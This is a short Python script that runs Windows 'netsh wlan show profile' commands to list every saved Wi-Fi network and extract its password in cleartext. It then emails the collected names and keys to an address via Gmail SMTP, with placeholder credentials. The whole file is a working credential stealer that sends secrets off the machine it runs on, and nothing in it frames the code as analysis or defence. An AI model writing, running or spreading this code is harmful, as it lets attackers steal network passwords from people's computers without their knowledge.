import subprocess, smtplib, re

command = "netsh wlan show profile"

def sendMail(email,password,content):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,content)
    server.quit()

result = subprocess.check_output(command,encoding ='utf-8',shell = True)

#network_names = re.search("(?:Profile\s*:\s)(.*)", result)

network_names_list = re.findall("(?:Profile\s*:\s)(.*)", result)
print(network_names_list)

result = "Here are your results: \n\n"
for i in range(0,len(network_names_list)):
    network_name = network_names_list[i]
    print(network_name)
    command = "netsh wlan show profile " + network_name + " key=clear"
    try:
        current_result = "Network Name: " + network_name + "\n\tPassword: " + subprocess.check_output(command,encoding='utf-8', stderr=subprocess.STDOUT, shell=True) + "\n" 
    except subprocess.CalledProcessError as error:
        print(str(error.output))
        current_result = "Error (probably couldn't find the network)\n"
    result = result + current_result
    
sendMail("enteryouremailhere","enteryourpasswordhere",result)
